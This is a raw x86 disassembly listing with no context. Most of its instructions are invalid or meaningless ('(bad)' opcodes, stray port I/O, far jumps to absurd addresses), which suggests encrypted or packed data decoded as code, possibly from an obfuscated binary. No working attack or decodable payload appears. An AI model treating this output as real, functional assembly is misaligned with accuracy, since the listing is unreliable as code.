  41010f:	or     eax,0x84b85fa9
  410114:	inc    edi
  410115:	inc    eax
  410116:	add    BYTE PTR [ebp-0x25],dl
  410119:	mov    esi,0xdc84d867
  41011e:	test   BYTE PTR [esi-0x23],bh
  410121:	fist   WORD PTR [eax]
  410123:	fstp   DWORD PTR [ebp+0x129aa421]
  410129:	test   eax,0x28e579f6
  41012e:	add    BYTE PTR [edx+0x5d],ch
  410131:	clc    
  410132:	mov    edi,0x38bf454
  410137:	mov    ch,0xfe
  410139:	and    al,0xb7
  41013b:	mov    ebp,0x7495844a
  410140:	fldl2e 
  410142:	outs   dx,BYTE PTR ds:[esi]
  410143:	jg     0x410112
  410145:	cmc    
  410146:	(bad)  
  410147:	out    dx,al
  410148:	sbb    ecx,DWORD PTR [eax-0x26bbd4d5]
  41014e:	addr16 push ss
  410150:	cmp    ah,dh
  410152:	daa    
  410153:	ror    BYTE PTR ds:0x33656889,1
  410159:	das    
  41015a:	xchg   ebp,eax
  41015b:	mov    ecx,0xfd45b634
  410160:	aad    0x72
  410162:	(bad)  
  410163:	fcom   st(3)
  410165:	adc    al,bl
  410167:	jmp    0x4101da
  410169:	xor    DWORD PTR [eax+0x4a12824b],edi
  41016f:	enter  0x1bd7,0x27
  410173:	bound  eax,QWORD PTR [edi-0x77]
  410176:	loop   0x410173
  410178:	int    0x80
  41017a:	test   DWORD PTR [ebx+0x5f],edx
  41017d:	or     bh,BYTE PTR [ebx+ebp*1+0x54]
  410181:	add    DWORD PTR [ecx+0x50a339e5],ebp
  410187:	push   ebx
  410188:	addr16 inc edx
  41018a:	leave  
  41018b:	(bad)  
  41018c:	pop    ds
  41018d:	push   0x8251ed6b
  410192:	mov    edi,0x2802aa2
  410197:	ror    BYTE PTR [esi],1
  410199:	ja     0x41014c
  41019b:	dec    ebx
  41019c:	jne    0x410150
  41019e:	(bad)  
  41019f:	out    dx,al
  4101a0:	bound  esi,QWORD PTR [ebx]
  4101a2:	arpl   WORD PTR [edi-0x756d9ab0],ax
  4101a8:	xor    eax,0xd17ae228
  4101ad:	clc    
  4101ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101af:	pop    ss
  4101b0:	xchg   bl,ch
  4101b2:	(bad)  
  4101b3:	xlat   BYTE PTR ds:[ebx]
  4101b4:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4101b6:	xchg   ecx,eax
  4101b7:	sbb    BYTE PTR [ebx-0x394ebcb2],ah
  4101bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101be:	test   eax,0xaa5bf965
  4101c3:	cld    
  4101c4:	and    al,0xf7
  4101c6:	test   DWORD PTR [esi+0x3c5af082],esi
  4101cc:	fadd   st(4),st
  4101ce:	jmp    0x5423464d
  4101d3:	cmp    al,0x88
  4101d5:	pinsrw mm0,eax,0x6b
  4101d9:	(bad)  
  4101da:	adc    bh,ch
  4101dc:	jl     0x410170
  4101de:	cli    
  4101df:	pop    ebp
  4101e0:	outs   dx,BYTE PTR ds:[esi]
  4101e1:	push   ss
  4101e2:	dec    edx
  4101e3:	mov    ds:0xfff88e41,eax
  4101e8:	adc    ecx,DWORD PTR [eax]
  4101ea:	cwde   
  4101eb:	loopne 0x4101ec
  4101ed:	dec    esp
  4101ee:	inc    ebx
  4101ef:	in     al,dx
  4101f0:	dec    edi
  4101f1:	jo     0x410210
  4101f3:	pop    ss
  4101f4:	rcr    BYTE PTR [ecx+0x66],cl
  4101f7:	hlt    
  4101f8:	les    ebp,FWORD PTR [eax-0x1e5f42c0]
  4101fe:	xchg   ebx,eax
  4101ff:	dec    edi
  410200:	adc    al,0xf1
  410202:	fs xchg esi,eax
  410204:	int3   
  410205:	loopne 0x4101c2
  410207:	retf   
  410208:	mov    dh,0x53
  41020a:	imul   esi,DWORD PTR [eax+0x24],0xffffff97
  41020e:	(bad)
  410211:	mov    bl,0xe8
  410213:	mov    ch,0x75
  410215:	bnd jo 0x410208
  410218:	int3   
  410219:	jge    0x41024e
  41021b:	and    edi,DWORD PTR [ebx-0x7b]
  41021e:	lahf   
  41021f:	xchg   edi,eax
  410220:	sub    al,0x16
  410222:	ret    
  410223:	jmp    0xb4cbb1c9
  410228:	out    dx,ax
  41022a:	cli    
  41022b:	pop    DWORD PTR [esi+0x680a0160]
  410231:	xor    dh,ch
  410233:	lea    ebp,[edi]
  410235:	mov    esp,0x4e30d939
  41023a:	sub    al,0x2a
  41023c:	add    dh,BYTE PTR [ebx-0x40]
  41023f:	pop    es
  410240:	rcr    BYTE PTR [ecx],0xb0
  410243:	and    esp,DWORD PTR [edi]
  410245:	inc    edx
  410246:	addr16 xchg esp,eax
  410248:	add    BYTE PTR [eax+0x1b],0xdf
  41024c:	inc    ecx
  41024d:	dec    esi
  41024e:	aam    0xa4
  410250:	push   eax
  410251:	mov    ah,bl
  410253:	imul   edx,esp,0x5cf55c13
  410259:	lods   eax,DWORD PTR ds:[esi]
  41025a:	into   
  41025b:	adc    eax,0xee59425b
  410260:	mov    ecx,0x21cb7b28
  410265:	xchg   ebp,eax
  410266:	or     al,0x6
  410268:	jl     0x41027d
  41026a:	dec    eax
  41026b:	aas    
  41026c:	gs out 0xa5,eax
  41026f:	leave  
  410270:	fsubr  DWORD PTR [eax]
  410272:	mul    BYTE PTR [ecx+0x5f6a4309]
  410278:	xchg   BYTE PTR [ecx+0x54a3c376],cl
  41027e:	inc    edi
  41027f:	neg    BYTE PTR [ebx+0x27c3040e]
  410285:	outs   dx,DWORD PTR ds:[esi]
  410286:	ret    
  410287:	fwait
  410288:	or     edi,ebx
  41028a:	mov    dh,0x41
  41028c:	pusha  
  41028d:	add    ecx,DWORD PTR [ebp+0x30]
  410290:	push   cs
  410291:	cli    
  410292:	cmp    DWORD PTR [ecx],0x265e9461
  410298:	mov    ch,0xe1
  41029a:	fist   WORD PTR [edx]
  41029c:	sub    DWORD PTR [esi+ebp*4+0x1e],edi
  4102a0:	gs fwait
  4102a2:	sbb    bh,bl
  4102a4:	and    edx,DWORD PTR [esi-0x35897b06]
  4102aa:	push   ebx
  4102ab:	test   BYTE PTR [ebx],ch
  4102ad:	pop    es
  4102ae:	push   esp
  4102af:	mov    ebp,0x6f5aee4
  4102b4:	(bad)  
  4102b5:	fst    DWORD PTR ds:0xf9dab13d
  4102bb:	addr16 mov ch,al
  4102be:	outs   dx,BYTE PTR ds:[esi]
  4102bf:	xchg   DWORD PTR [ebx+0x26],edi
  4102c2:	cmc    
  4102c3:	inc    eax
  4102c4:	shl    DWORD PTR [esi+0x65],0x91
  4102c8:	sub    al,0x8e
  4102ca:	add    eax,0xa9f5af44
  4102cf:	jbe    0x4102cc
  4102d1:	pop    edx
  4102d2:	xchg   esi,eax
  4102d3:	rol    ah,0xf6
  4102d6:	(bad)  
  4102d7:	imul   ebp,DWORD PTR cs:[edx-0x552a3bd8],0xffffffb8
  4102df:	fldenv [edi]
  4102e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102e2:	clc    
  4102e3:	jne    0x41030f
  4102e5:	jl     0x4102ef
  4102e7:	les    ebx,FWORD PTR [edi]
  4102e9:	ja     0x41031e
  4102eb:	mov    WORD PTR [esp+ecx*4-0x305b9e58],fs
  4102f2:	jmp    0xe384:0x6bc8f6af
  4102f9:	jmp    0x4102fb
  4102fb:	fcom   st(0)
  4102fd:	sbb    cl,ch
  4102ff:	sahf   
  410300:	shl    ecx,cl
  410302:	daa    
  410303:	dec    edi
  410304:	pusha  
  410305:	int    0xe4
  410307:	jno    0x4102e1
  410309:	sub    al,0x90
  41030b:	(bad)  
  41030c:	jo     0x4102ae
  41030e:	in     eax,dx
  41030f:	popa   
  410310:	popa   
  410311:	and    eax,0x67e2f000
  410316:	pop    es
  410317:	(bad)  
  410318:	push   0xffffffbd
  41031a:	jno    0x41037f
  41031c:	jge    0x41031b
  41031e:	sub    eax,0xaf401529
  410323:	sbb    DWORD PTR [ebx+0x426fac90],esi
  410329:	push   es
  41032a:	jmp    0x4102e1
  41032c:	inc    esi
  41032d:	inc    eax
  41032e:	sbb    al,0xb1
  410330:	mov    bl,0x7e
  410332:	cmp    DWORD PTR [ebx+0x35],edi
  410335:	iret   
  410336:	fcom   QWORD PTR [esi+0x29]
  410339:	mov    ds:0xefbcfab2,eax
  41033e:	fmul   DWORD PTR [edi-0x44]
  410341:	mov    ebx,ebp
  410343:	add    bl,0x5
  410346:	test   eax,0x8268f8dc
  41034b:	aam    0xbd
  41034d:	je     0x4102fd
  41034f:	xchg   ecx,eax
  410350:	hlt    
  410351:	mov    cl,0x12
  410353:	jns    0x410371
  410355:	outs   dx,DWORD PTR ds:[esi]
  410356:	mov    bl,0x5f
  410358:	in     eax,dx
  410359:	jge    0x4102f9
  41035b:	mov    WORD PTR [ecx+0xd],gs
  41035e:	mov    ds:0xe0f953e0,eax
  410363:	lock mov BYTE PTR [ecx+0x5f],0x4d
  410368:	pushf  
  410369:	retf   0x5e51
  41036c:	js     0x41037e
  41036e:	(bad)  
  41036f:	aam    0x9b
  410371:	push   esp
  410372:	lods   eax,DWORD PTR ds:[esi]
  410373:	jbe    0x4103f3
  410375:	into   
  410376:	dec    eax
  410377:	ficom  DWORD PTR [edx]
  410379:	pop    ss
  41037a:	out    dx,al
  41037b:	scas   eax,DWORD PTR es:[edi]
  41037c:	daa    
  41037d:	aaa    
  41037e:	ins    BYTE PTR es:[edi],dx
  41037f:	jg     0x4103f9
  410381:	inc    edi
  410382:	xlat   BYTE PTR ds:[ebx]
  410383:	dec    esp
  410384:	push   cs
  410385:	ds mov ebp,0xd5d26e39
  41038b:	mov    al,al
  41038d:	pop    esp
  41038e:	sbb    cl,dl
  410390:	cmp    DWORD PTR [eax+0x3a],ebp
  410393:	sbb    al,0xe3
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd05
  4103a6:	add    ecx,DWORD PTR ds:0x42fd09
  4103ac:	mov    DWORD PTR ds:0x42fd05,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e11c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x1c8:0x22f6bab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	ds call 0x3a713098
  4103e0:	add    bh,BYTE PTR [edi-0x3b]
  4103e3:	lods   al,BYTE PTR ds:[esi]
  4103e4:	xchg   ebp,eax
  4103e5:	sub    eax,0x4125df80
  4103ea:	test   BYTE PTR [edx+edi*8+0x1c9482f0],ch
  4103f1:	add    edx,DWORD PTR [ebp+0x1be2a353]
  4103f7:	sub    DWORD PTR [edi-0x69],edx
  4103fa:	lahf   
  4103fb:	push   esi
  4103fc:	nop
  4103fd:	jns    0x41044c
  4103ff:	jp     0x410418
  410401:	shl    al,0xcc
  410404:	mov    eax,ds:0x3dc815d2
  410409:	in     eax,0xba
  41040b:	je     0x41043c
  41040d:	xchg   ebp,eax
  41040e:	fisubr DWORD PTR [ebp+0x21]
  410411:	inc    ebx
  410412:	xor    BYTE PTR [esi],bh
  410414:	add    al,bh
  410416:	and    DWORD PTR [ebp-0x16fd5d29],0xffffffe8
  41041d:	and    eax,DWORD PTR [edx]
  41041f:	ret    
  410420:	out    0x29,eax
  410422:	retf   
  410423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410424:	fmul   DWORD PTR [edx-0x2f]
  410427:	and    al,0x53
  410429:	das    
  41042a:	(bad)  
  41042b:	and    al,0x8d
  41042d:	ret    
  41042e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41042f:	inc    eax
  410430:	(bad)  
  410431:	sub    DWORD PTR [esi],ebp
  410433:	adc    eax,DWORD PTR [esi]
  410435:	jbe    0x41049d
  410437:	cmp    BYTE PTR [ebx+ebp*1],dl
  41043a:	jno    0x4104a1
  41043c:	adc    BYTE PTR [eax+0x4bab6f3a],bl
  410442:	jl     0x4103dc
  410444:	js     0x4104a7
  410446:	mov    ch,0xc7
  410448:	sar    DWORD PTR [edx+0x5f997da2],0x5f
  41044f:	dec    edi
  410450:	adc    BYTE PTR cs:[ebp-0x36e1bc7d],al
  410457:	mov    bh,0x3a
  410459:	pushf  
  41045a:	or     eax,0x891a9ad1
  41045f:	pop    eax
  410460:	outs   dx,BYTE PTR ds:[esi]
  410461:	jne    0x4104c3
  410463:	ret    0xee50
  410466:	pop    es
  410467:	push   ss
  410468:	enter  0xbbad,0x62
  41046c:	cmc    
  41046d:	xchg   ecx,eax
  41046e:	xlat   BYTE PTR ds:[ebx]
  41046f:	aad    0x6d
  410471:	stos   DWORD PTR es:[edi],eax
  410472:	(bad)  
  410473:	cmp    eax,0xa33e54dd
  410478:	or     eax,0xd9760726
  41047d:	data16 jp 0x410475
  410480:	pop    ecx
  410481:	(bad)  
  410482:	(bad)  
  410483:	out    0x96,al
  410485:	mov    bh,0x43
  410487:	mov    ds:0x9d51c0f7,eax
  41048c:	jmp    0x15e817cf
  410491:	das    
  410492:	leave  
  410493:	sub    al,0x7
  410495:	fwait
  410496:	jge    0x410507
  410498:	or     eax,0x87aee41a
  41049d:	xchg   BYTE PTR [ebp-0x25ee4fef],cl
  4104a3:	inc    ebx
  4104a4:	(bad)  
  4104a5:	(bad)  
  4104a6:	lahf   
  4104a7:	push   0x6e90a57f
  4104ac:	cmp    edi,eax
  4104ae:	out    0x3d,al
  4104b0:	test   eax,0x75651da2
  4104b5:	mov    ebp,0xd87e5fa7
  4104ba:	push   eax
  4104bb:	call   0xb3f:0xc89db8a2
  4104c2:	add    DWORD PTR [edi+0x5b],eax
  4104c5:	daa    
  4104c6:	inc    ecx
  4104c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104c8:	inc    eax
  4104c9:	xchg   ebp,eax
  4104ca:	cmp    DWORD PTR [esi+ebx*2+0x5bbc061],ecx
  4104d1:	push   es
  4104d2:	jbe    0x41054b
  4104d4:	dec    ecx
  4104d5:	cmp    BYTE PTR [ebx-0x37],dl
  4104d8:	jb     0x4104a3
  4104da:	fdivr  QWORD PTR [ebx]
  4104dc:	xor    dl,ch
  4104de:	fisub  WORD PTR [edi]
  4104e0:	mov    eax,0x42f9977d
  4104e5:	or     cl,bl
  4104e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104e8:	mov    dl,0x97
  4104ea:	and    al,0x1a
  4104ec:	jb     0x41048a
  4104ee:	jne    0x4104d9
  4104f0:	jecxz  0x4104f6
  4104f2:	retf   
  4104f3:	mov    dh,0x37
  4104f5:	cmp    BYTE PTR [edi-0x3123055a],al
  4104fb:	aad    0x73
  4104fd:	and    eax,0x43576ff4
  410502:	mov    bh,0x6e
  410504:	dec    ebx
  410505:	pop    ecx
  410506:	es test al,0x92
  410509:	ss das 
  41050b:	mov    ah,0xf7
  41050d:	fs pop ebp
  41050f:	and    dl,BYTE PTR [eax-0x6]
  410512:	mov    ch,0x8b
  410514:	xchg   edi,eax
  410515:	lock pop ss
  410517:	sbb    ebp,DWORD PTR [ecx]
  410519:	mov    eax,0x17b0a662
  41051e:	shr    DWORD PTR [edi-0xd685536],cl
  410524:	cmp    DWORD PTR [esi],eax
  410526:	out    dx,eax
  410527:	and    al,0x43
  410529:	xchg   esp,eax
  41052a:	or     BYTE PTR [edi-0x1606082f],bl
  410530:	cli    
  410531:	pop    ecx
  410532:	add    BYTE PTR [edi+0x0],0xfb
  410536:	nop
  410537:	hlt    
  410538:	xchg   ecx,eax
  410539:	sub    BYTE PTR [ecx+0x3a],ah
  41053c:	imul   ecx,DWORD PTR [ebp+0xc],0x99f25432
  410543:	pop    edx
  410544:	(bad)  
  410546:	and    esi,DWORD PTR [esp+esi*1-0x5a36a993]
  41054d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41054e:	outs   dx,BYTE PTR ds:[esi]
  41054f:	cmp    edx,DWORD PTR [ecx]
  410551:	add    edi,esi
  410553:	and    DWORD PTR [ecx],ebp
  410555:	mov    esp,0xab3598a
  41055a:	gs loope 0x410526
  41055d:	push   0x5
  41055f:	dec    ebx
  410560:	sub    BYTE PTR [edx+ebx*1+0x38],0x56
  410565:	xor    eax,0x6ba851e7
  41056a:	and    BYTE PTR [ebx+0x126defd7],0xca
  410571:	retf   
  410572:	loopne 0x41058b
  410574:	or     bh,BYTE PTR [ebx]
  410576:	daa    
  410577:	sbb    ebx,DWORD PTR [eax]
  410579:	adc    dl,bl
  41057b:	add    DWORD PTR [esi+0x63],ebp
  41057e:	lock ins BYTE PTR es:[edi],dx
  410580:	inc    ecx
  410581:	add    DWORD PTR [ebp+eax*1+0x35c8a6a2],eax
  410588:	das    
  410589:	dec    edi
  41058a:	push   ebx
  41058b:	and    eax,edi
  41058d:	pushf  
  41058e:	push   ds
  41058f:	adc    cl,cl
  410591:	pop    es
  410592:	fwait
  410593:	mov    edi,0x290e1f23
  410598:	jne    0x41055d
  41059a:	sub    BYTE PTR [edi-0x45],cl
  41059d:	push   es
  41059e:	xor    edi,DWORD PTR [ebx+0x3]
  4105a1:	out    0x1f,eax
  4105a3:	lea    eax,[edx-0x7]
  4105a6:	xchg   DWORD PTR [ebx+0x2d],eax
  4105a9:	pop    edx
  4105aa:	xchg   edi,eax
  4105ab:	inc    esi
  4105ac:	sub    DWORD PTR [ecx-0x23c5e4c9],edi
  4105b2:	mov    edx,0x93daad0f
  4105b7:	lods   al,BYTE PTR ds:[esi]
  4105b8:	aas    
  4105b9:	sbb    al,0x40
  4105bb:	lods   al,BYTE PTR ds:[esi]
  4105bc:	les    ebp,FWORD PTR [ebp+0x59]
  4105bf:	loope  0x410547
  4105c1:	out    dx,al
  4105c2:	sbb    ebx,DWORD PTR [edx]
  4105c4:	cmp    eax,DWORD PTR [bx+si-0x6453]
  4105c9:	int3   
  4105ca:	adc    eax,ecx
  4105cc:	sub    BYTE PTR [edi],0x41
  4105cf:	inc    ebp
  4105d0:	pop    es
  4105d1:	inc    ax
  4105d3:	cmp    eax,0x4191703c
  4105d8:	sbb    DWORD PTR [edx+esi*4+0x7bb191e5],ebx
  4105df:	mov    esp,0xf7228830
  4105e4:	mov    bl,0x8
  4105e6:	imul   edi,DWORD PTR [ecx+0x4172e120],0x6ccf3ae5
  4105f0:	sti    
  4105f1:	or     al,0x2a
  4105f3:	out    0x82,al
  4105f5:	pop    ebx
  4105f6:	jmp    0xf652696f
  4105fb:	push   0x908b8edc
  410600:	xchg   ebx,eax
  410601:	outs   dx,DWORD PTR es:[esi]
  410603:	call   0x7a605fd9
  410608:	mov    ss,WORD PTR [edi+0x76ce7dc1]
  41060e:	mov    ebp,0x6ab0c0aa
  410613:	sbb    DWORD PTR [ecx+0x53],ebp
  410616:	hlt    
  410617:	mov    esp,0xfb8124d
  41061c:	lea    eax,[edi+0x22d16d46]
  410622:	or     eax,0x6a9f1890
  410627:	xchg   ecx,eax
  410628:	jmp    0x410603
  41062a:	lock daa 
  41062c:	pop    edi
  41062d:	daa    
  41062e:	mov    bh,0xb8
  410630:	mov    DWORD PTR [ecx+ebp*1+0x569de5a7],esi
  410637:	sbb    BYTE PTR [ecx+0x37a1b968],ah
  41063d:	test   DWORD PTR ds:0x16ffd47a,edi
  410643:	xchg   edi,eax
  410644:	in     eax,dx
  410645:	add    DWORD PTR [ebx-0x35875480],0x41d7ded5
  41064f:	mov    ecx,?
  410651:	cmp    DWORD PTR [ecx-0x7f86d478],esp
  410657:	repz ret 0x2d6e
  41065b:	pop    es
  41065c:	add    edx,edx
  41065e:	dec    ebp
  41065f:	imul   edi,DWORD PTR [ebx-0x22],0xb8d854a6
  410666:	xchg   ebp,eax
  410667:	arpl   WORD PTR [eax],dx
  410669:	inc    eax
  41066a:	cmp    BYTE PTR [ecx],al
  41066c:	rcl    BYTE PTR [edx-0x1243eb9c],0x56
  410673:	sbb    BYTE PTR [eax-0x39a196eb],ch
  410679:	inc    edi
  41067a:	pop    ebx
  41067b:	in     eax,0xd7
  41067d:	push   es
  41067e:	xchg   ecx,eax
  41067f:	adc    ch,BYTE PTR [ecx+ebp*2-0x54]
  410683:	and    ah,BYTE PTR [ebx+0x6cc030fe]
  410689:	dec    ebp
  41068a:	and    al,0x82
  41068c:	push   edi
  41068d:	jp     0x41061e
  41068f:	test   cl,cl
  410691:	sub    BYTE PTR [edx],dh
  410693:	enter  0x1a4f,0xa
  410697:	push   es
  410698:	fcmove st,st(6)
  41069a:	xchg   edx,eax
  41069b:	gs js  0x4106e9
  41069e:	addr16 aad 0xd1
  4106a1:	outs   dx,BYTE PTR ds:[esi]
  4106a2:	call   0x3d8:0x9f7a4051
  4106a9:	cmp    al,0x9
  4106ab:	mov    bh,0xa6
  4106ad:	call   0x9d117bc6
  4106b2:	mov    ah,0xff
  4106b4:	repnz push esi
  4106b6:	pusha  
  4106b7:	pop    eax
  4106b8:	test   edx,edi
  4106ba:	mov    dl,0x77
  4106bc:	mov    edx,0xb5a80ea1
  4106c1:	or     DWORD PTR [edx+esi*8-0x1a],edi
  4106c5:	add    bh,ah
  4106c7:	xchg   esp,eax
  4106c8:	iret   
  4106c9:	or     ch,dl
  4106cb:	push   edx
  4106cc:	ja     0x4106ee
  4106ce:	push   es
  4106cf:	leave  
  4106d0:	xchg   esi,eax
  4106d1:	pop    ds
  4106d2:	setns  BYTE PTR [ecx+0xb995a25]
  4106d9:	pop    edx
  4106da:	push   ds
  4106db:	mov    edx,0xf29ae8b4
  4106e0:	ins    DWORD PTR es:[edi],dx
  4106e1:	(bad)
  4106e5:	and    eax,0x5be023b9
  4106ea:	inc    ebx
  4106eb:	cmp    ebx,esi
  4106ed:	push   cs
  4106ee:	or     eax,0x54ab26ab
  4106f3:	das    
  4106f4:	and    eax,DWORD PTR [edi-0x39f6865e]
  4106fa:	xchg   edi,eax
  4106fb:	pop    eax
  4106fc:	mov    ds:0x51483b1c,eax
  410701:	add    BYTE PTR [eax],0xe2
  410704:	lods   eax,DWORD PTR ds:[esi]
  410705:	js     0x4106e9
  410707:	jmp    0x4106e2
  410709:	push   0xa31cbcaa
  41070e:	pop    esi
  41070f:	ss mov ebx,0x873c066f
  410715:	call   FWORD PTR fs:[esi-0x28490d26]
  41071c:	addr16 lock jne 0x410742
  410720:	dec    esp
  410721:	mov    al,ds:0xbed6bebc
  410726:	sbb    DWORD PTR [ebp+0x3bc4c7b7],edx
  41072c:	ins    BYTE PTR es:[edi],dx
  41072d:	mov    bl,0x7
  41072f:	repz xchg ebp,eax
  410731:	sub    eax,0x5b5452b4
  410736:	inc    esp
  410737:	in     al,0x30
  410739:	sti    
  41073a:	ficom  DWORD PTR [ecx+edx*1-0x647fffba]
  410741:	les    edx,FWORD PTR [edi]
  410743:	dec    ebx
  410744:	push   0x2d00d391
  410749:	xchg   ebx,ebp
  41074b:	add    dh,BYTE PTR [ebx-0x2f379933]
  410751:	dec    ecx
  410752:	jp     0x7527396c
  410758:	mov    DWORD PTR [esi],esp
  41075a:	push   ebp
  41075b:	lods   eax,DWORD PTR ds:[esi]
  41075c:	call   0x425f:0x2410bd03
  410763:	pop    ebx
  410764:	test   al,0x6d
  410766:	adc    ecx,DWORD PTR [esp+esi*4-0x5d6c0c90]
  41076d:	push   es
  41076e:	push   eax
  41076f:	inc    eax
  410770:	lock mov cl,0x92
  410773:	fdivr  DWORD PTR [eax-0x3a]
  410776:	push   es
  410777:	mov    esp,DWORD PTR [esi]
  410779:	jg     0x410778
  41077b:	inc    ecx
  41077c:	inc    esi
  41077d:	pop    esp
  41077e:	add    DWORD PTR [edx],0x31263bf5
  410784:	fisubr WORD PTR [edi+0x66]
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	sbb    al,0x3d
  4107aa:	ins    BYTE PTR es:[edi],dx
  4107ab:	lds    ecx,FWORD PTR [ebx-0x5c8f8fba]
  4107b1:	jge    0x410823
  4107b3:	jo     0x410819
  4107b5:	jbe    0x410775
  4107b7:	xor    BYTE PTR [ebp+0x742a9e9c],cl
  4107bd:	push   cs
  4107be:	lods   al,BYTE PTR ds:[esi]
  4107bf:	mov    dh,0x6e
  4107c1:	sub    DWORD PTR [eax+0x51],ecx
  4107c4:	cwde   
  4107c5:	shr    DWORD PTR [eax],1
  4107c7:	mov    edx,ecx
  4107c9:	mov    cs,esi
  4107cb:	cmp    esi,DWORD PTR [edx+ebp*1+0x36]
  4107cf:	daa    
  4107d0:	and    DWORD PTR [eax+ebp*4+0x5e],edx
  4107d4:	lock or BYTE PTR [edi-0x74d08553],bl
  4107db:	sbb    DWORD PTR [ecx+0x14],esi
  4107de:	jmp    0xbdd76bcc
  4107e3:	out    0xc7,al
  4107e5:	mov    ch,0x73
  4107e7:	or     edx,DWORD PTR [eax]
  4107e9:	pop    ds
  4107ea:	test   BYTE PTR [ebx+0x54],0x25
  4107ee:	mov    dl,0xc8
  4107f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107f1:	and    DWORD PTR [ebx-0x15966f58],ebp
  4107f7:	fsub   st,st(1)
  4107f9:	fld    DWORD PTR [esi]
  4107fb:	mov    cl,0x11
  4107fd:	mov    al,0x8b
  4107ff:	or     al,0xc1
  410801:	stc    
  410802:	xor    eax,0x7c63866
  410807:	sbb    DWORD PTR [ebp+ebx*2+0x7c06eb69],edi
  41080e:	setae  cl
  410811:	inc    edx
  410812:	pop    eax
  410813:	stos   DWORD PTR es:[edi],eax
  410814:	add    BYTE PTR [eax+ebp*2+0x57d8880a],ch
  41081b:	jno    0x410841
  41081d:	out    0xd1,eax
  41081f:	pop    esi
  410820:	mov    esi,0x9884779c
  410825:	(bad)  
  410826:	rcr    BYTE PTR ds:0xe2fdbbda,1
  41082c:	inc    ebp
  41082d:	leave  
  41082e:	mov    al,ds:0x6ff4425d
  410833:	aas    
  410834:	mov    ah,0x2
  410836:	add    eax,0x979254ac
  41083b:	sub    eax,0x96034d64
  410840:	sbb    DWORD PTR [esi],esp
  410842:	cld    
  410843:	add    DWORD PTR [ecx],ebx
  410845:	addr16 mov dh,0x2a
  410848:	loope  0x41086d
  41084a:	std    
  41084b:	bound  esp,QWORD PTR [esi+0x8a862da]
  410851:	cli    
  410852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410853:	dec    ecx
  410854:	fwait
  410855:	adc    eax,0xfac46e02
  41085a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41085b:	mov    al,0xa1
  41085d:	in     eax,dx
  41085e:	in     eax,0x6a
  410860:	adc    eax,0xb764015d
  410865:	adc    al,0x1f
  410867:	push   0x3a1f9580
  41086c:	adc    eax,0x7b01b6fd
  410871:	xchg   esi,eax
  410872:	xor    BYTE PTR [eax+eax*8+0x3b08816f],bh
  410879:	xchg   edi,eax
  41087a:	inc    ebp
  41087b:	xchg   ecx,eax
  41087c:	sub    al,0x76
  41087e:	call   0xf4dd:0x5c9b9aad
  410885:	mov    bl,0x13
  410887:	arpl   WORD PTR [edi],si
  410889:	pop    edi
  41088a:	xchg   ebx,eax
  41088b:	inc    edi
  41088c:	cmc    
  41088d:	jne    0x4108d8
  41088f:	(bad)  
  410890:	sub    edx,DWORD PTR [edi]
  410892:	mov    edx,0xd50be445
  410897:	mov    bl,0xd2
  410899:	rol    DWORD PTR [edx],0x2f
  41089c:	fistp  DWORD PTR [ecx+0x21]
  41089f:	mov    ebp,0x8cd51962
  4108a4:	(bad)  [esi-0x628bb5c0]
  4108aa:	jbe    0x4108a4
  4108ac:	xor    eax,0xb3144a97
  4108b1:	mov    esp,0x8c4534cf
  4108b6:	and    DWORD PTR [ebx-0x54807507],0xd96bd227
  4108c0:	iret   
  4108c1:	sub    BYTE PTR [esi],0xe4
  4108c4:	xchg   edi,eax
  4108c5:	push   esp
  4108c6:	sub    edi,eax
  4108c8:	pop    ds
  4108c9:	adc    BYTE PTR [edi*1+0x7e8e3d3],dh
  4108d0:	js     0x4108b8
  4108d2:	push   esp
  4108d3:	lea    eax,[ebx-0x7c]
  4108d6:	sub    bh,bh
  4108d8:	or     eax,0xb0e1bdf6
  4108dd:	int3   
  4108de:	mov    al,ds:0x89095e8c
  4108e3:	sbb    cl,BYTE PTR [edi-0x61e889b]
  4108e9:	fdivr  DWORD PTR [eax]
  4108eb:	xor    BYTE PTR [ebx+ebx*8-0x528dd61b],dh
  4108f2:	xchg   ecx,eax
  4108f3:	or     BYTE PTR [esi+ebp*4],cl
  4108f6:	fimul  WORD PTR [edx+ebp*2]
  4108f9:	jp     0x410886
  4108fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108fc:	je     0x410912
  4108fe:	xchg   ebp,eax
  4108ff:	stc    
  410900:	fwait
  410901:	jno    0x410977
  410903:	inc    ebp
  410904:	xor    ebx,DWORD PTR [edx+0x77]
  410907:	mov    edx,0x2dfc405f
  41090c:	sbb    eax,0x7cf02e10
  410911:	test   al,0x68
  410913:	cmp    esp,DWORD PTR [eax]
  410915:	je     0x4108fe
  410917:	imul   ecx,DWORD PTR es:[edx-0x7e],0x178032ce
  41091f:	ds pop ds
  410921:	sbb    al,0xee
  410923:	cli    
